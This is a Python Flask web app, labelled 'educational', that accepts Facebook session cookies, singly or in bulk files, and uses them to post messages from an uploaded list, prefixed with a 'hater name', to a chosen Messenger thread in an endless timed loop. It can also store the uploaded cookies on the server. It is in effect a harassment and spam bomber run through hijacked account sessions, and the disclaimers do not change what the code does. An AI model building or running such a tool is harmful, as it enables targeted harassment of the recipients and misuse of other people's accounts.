from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
import json
import os

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'https://www.google.com'
}

stop_events = {}
threads = {}

COOKIES_JSON_PATH = "cookies.json"  # optional persistent file location

# -------------------------
# Helpers for cookie parsing
# -------------------------
def cookie_string_to_dict(cookie_str):
    """
    Convert a cookie string like 'c_user=123; xs=abc; fr=...' into a dict.
    """
    cookie_dict = {}
    for part in cookie_str.split(';'):
        part = part.strip()
        if '=' in part:
            k, v = part.split('=', 1)
            cookie_dict[k.strip()] = v.strip()
    return cookie_dict

def parse_cookie_file_lines(file_storage):
    """
    Accepts a file where each line is either:
      - a cookie JSON object (single-line JSON), or
      - a cookie string "c_user=...; xs=..."
    Returns list of cookie dicts.
    """
    cookies_list = []
    text = file_storage.read().decode(errors='ignore')
    for raw in text.splitlines():
        raw = raw.strip()
        if not raw:
            continue
        # Try JSON parse first
        if raw.startswith('{') and raw.endswith('}'):
            try:
                d = json.loads(raw)
                if isinstance(d, dict):
                    cookies_list.append(d)
                    continue
            except Exception:
                pass
        # Otherwise treat as "name=value; name2=value2"
        cookies_list.append(cookie_string_to_dict(raw))
    return cookies_list

def load_cookies_from_json_file(file_storage):
    """
    Accepts a file storage that is a JSON array of cookie objects:
      [ {"c_user":"...","xs":"..."}, {...} ]
    Returns list of cookie dicts.
    """
    text = file_storage.read().decode(errors='ignore')
    data = json.loads(text)
    if isinstance(data, list):
        return [dict(item) for item in data]
    elif isinstance(data, dict):
        return [data]
    else:
        return []

def save_cookies_json(cookies_list, path=COOKIES_JSON_PATH):
    """
    Save cookie list to cookies.json for reuse.
    """
    with open(path, "w", encoding="utf-8") as f:
        json.dump(cookies_list, f, indent=2)

# -------------------------
# Message sending worker
# -------------------------
def send_messages(cookies_list, thread_id, hater_name, time_interval, messages, task_id):
    """
    cookies_list: list of dicts, each dict is cookie_name->cookie_value
    thread_id: uid/tid or target identifier
    hater_name: prefix string
    time_interval: seconds between requests
    messages: list of message strings
    task_id: id to check stop_event
    """
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for message_text in messages:
            if stop_event.is_set():
                break
            for cookie in cookies_list:
                # Compose message
                full_message = (str(hater_name) + " " + message_text).strip()
                # Example: Graph API URL that previously used token
                # NOTE: Using cookies to access Graph endpoints is unreliable; this is educational.
                api_url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                # When using cookies with requests, pass cookie dict as `cookies=...`
                try:
                    # If you previously used 'access_token' param, we no longer set it; we rely on cookies.
                    payload = {'message': full_message}
                    resp = requests.post(api_url, data=payload, headers=headers, cookies=cookie, timeout=15)
                    if resp.status_code == 200:
                        print(f"[{task_id}] Sent using cookie (keys: {list(cookie.keys())[:3]}...): {full_message}")
                    else:
                        print(f"[{task_id}] Failed ({resp.status_code}) using cookie keys {list(cookie.keys())[:3]}...: {full_message}")
                        # For debugging you may print resp.text but be careful with sensitive data
                except Exception as e:
                    print(f"[{task_id}] Exception sending with cookie keys {list(cookie.keys())[:3]}...: {e}")
                # respect the time interval
                time.sleep(time_interval)
    print(f"[{task_id}] Worker exiting (stopped).")

# -------------------------
# Routes
# -------------------------
@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        # cookieOption: 'single' | 'file' | 'json'
        cookie_option = request.form.get('cookieOption')

        # Build cookies_list (list of dicts)
        cookies_list = []
        # If single cookie string provided
        if cookie_option == 'single':
            single_cookie = request.form.get('singleCookie', '').strip()
            if not single_cookie:
                return "Single cookie empty", 400
            cookies_list = [cookie_string_to_dict(single_cookie)]
        elif cookie_option == 'file':
            cookie_file = request.files.get('cookieFile')
            if not cookie_file:
                return "No cookie file uploaded", 400
            cookies_list = parse_cookie_file_lines(cookie_file)
        elif cookie_option == 'json':
            cookie_json_file = request.files.get('cookieJsonFile')
            if not cookie_json_file:
                return "No cookies.json uploaded", 400
            cookies_list = load_cookies_from_json_file(cookie_json_file)
        else:
            return "Invalid cookie option", 400

        # Optionally persist cookies to cookies.json
        persist = request.form.get('persistCookies', 'no')
        if persist.lower() in ('yes', 'true', '1'):
            try:
                save_cookies_json(cookies_list)
            except Exception as e:
                print("Warning: could not save cookies.json:", e)

        # Other form fields
        thread_id = request.form.get('threadId')
        if not thread_id:
            return "threadId required", 400
        hater_name = request.form.get('kidx', '').strip()  # using your original name field
        try:
            time_interval = int(request.form.get('time', '2'))
            if time_interval < 0:
                time_interval = 2
        except ValueError:
            time_interval = 2

        txt_file = request.files.get('txtFile')
        if not txt_file:
            return "txtFile (messages) required", 400
        messages = txt_file.read().decode(errors='ignore').splitlines()
        if not messages:
            return "No messages found in txtFile", 400

        # Start worker thread
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        stop_events[task_id] = Event()
        worker = Thread(target=send_messages, args=(cookies_list, thread_id, hater_name, time_interval, messages, task_id))
        threads[task_id] = worker
        worker.start()

        return f"Task started with ID: {task_id}"

    # GET -> render a form (converted from your original template)
    return render_template_string('''
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Cookie-based Messenger (educational)</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background:#0b0b0b; color:#fff; padding:30px; }
    .card { background:#131313; border-radius:12px; }
    .form-control { background:transparent; color:#fff; border:1px solid #444; }
    label { color:#ddd; }
  </style>
</head>
<body>
<div class="container">
  <div class="card p-4 mx-auto" style="max-width:480px;">
    <h3 class="mb-3 text-center">Cookie-based Messenger (Educational)</h3>
    <form method="post" enctype="multipart/form-data">
      <div class="mb-2">
        <label for="cookieOption">Cookie Input Type</label>
        <select id="cookieOption" name="cookieOption" class="form-control" onchange="toggleCookieInputs()" required>
          <option value="single">Single Cookie String</option>
          <option value="file">Cookie File (one cookie string per line)</option>
          <option value="json">Upload cookies.json</option>
        </select>
      </div>

      <div id="singleCookieDiv" class="mb-2">
        <label>Single cookie (e.g. c_user=...; xs=...)</label>
        <input type="text" name="singleCookie" class="form-control" placeholder="c_user=123; xs=abc;">
      </div>

      <div id="fileCookieDiv" class="mb-2" style="display:none;">
        <label>Cookie file (one cookie string per line)</label>
        <input type="file" name="cookieFile" class="form-control">
      </div>

      <div id="jsonCookieDiv" class="mb-2" style="display:none;">
        <label>cookies.json (array of cookie objects)</label>
        <input type="file" name="cookieJsonFile" class="form-control">
      </div>

      <div class="mb-2">
        <label>Persist uploaded cookies to server as cookies.json?</label>
        <select name="persistCookies" class="form-control">
          <option value="no">No</option>
          <option value="yes">Yes (overwrite cookies.json)</option>
        </select>
      </div>

      <div class="mb-2">
        <label>Thread ID (uid/tid)</label>
        <input type="text" name="threadId" class="form-control" required>
      </div>

      <div class="mb-2">
        <label>Hater Name (prefix)</label>
        <input type="text" name="kidx" class="form-control" placeholder="Name to prefix messages">
      </div>

      <div class="mb-2">
        <label>Time interval (seconds)</label>
        <input type="number" name="time" class="form-control" value="2" min="0">
      </div>

      <div class="mb-2">
        <label>Messages .txt file (one message per line)</label>
        <input type="file" name="txtFile" class="form-control" required>
      </div>

      <button class="btn btn-primary w-100" type="submit">Start</button>
    </form>

    <hr/>
    <h6>Stop a running task</h6>
    <form method="post" action="/stop">
      <label>Task ID</label>
      <input type="text" name="taskId" class="form-control mb-2" required>
      <button class="btn btn-danger w-100" type="submit">Stop</button>
    </form>

    <div class="mt-3 text-muted small">
      <p>Educational only. Do not use for unsolicited messaging or to violate platform rules.</p>
    </div>
  </div>
</div>

<script>
function toggleCookieInputs(){
  var v = document.getElementById('cookieOption').value;
  document.getElementById('singleCookieDiv').style.display = (v==='single') ? 'block' : 'none';
  document.getElementById('fileCookieDiv').style.display = (v==='file') ? 'block' : 'none';
  document.getElementById('jsonCookieDiv').style.display = (v==='json') ? 'block' : 'none';
}
</script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if not task_id:
        return "taskId required", 400
    if task_id in stop_events:
        stop_events[task_id].set()
        return f"Task with ID {task_id} has been stopped."
    else:
        return f"No task found with ID {task_id}.", 404

# Optional API: start task by JSON payload
@app.route('/api/start', methods=['POST'])
def api_start():
    """
    Example JSON body:
    {
      "cookies": [{"c_user":"...", "xs":"..."}],
      "threadId": "1234567890",
      "haterName": "Jassa",
      "time": 2,
      "messages": ["hi","hello"]
    }
    """
    data = request.get_json(force=True)
    if not data:
        return jsonify({"error":"JSON body required"}), 400

    cookies_list = data.get('cookies')
    if not cookies_list:
        return jsonify({"error":"cookies list required"}), 400
    thread_id = data.get('threadId')
    if not thread_id:
        return jsonify({"error":"threadId required"}), 400
    hater_name = data.get('haterName','')
    time_interval = int(data.get('time',2))
    messages = data.get('messages',[])
    if not messages:
        return jsonify({"error":"messages list required"}), 400

    task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    stop_events[task_id] = Event()
    worker = Thread(target=send_messages, args=(cookies_list, thread_id, hater_name, time_interval, messages, task_id))
    threads[task_id] = worker
    worker.start()
    return jsonify({"task_id": task_id, "status":"started"})

if __name__ == '__main__':
    # If a persistent cookies.json exists, you may load it when needed.
    # e.g. load and inspect if you want.
    app.run(host='0.0.0.0', port=5000)
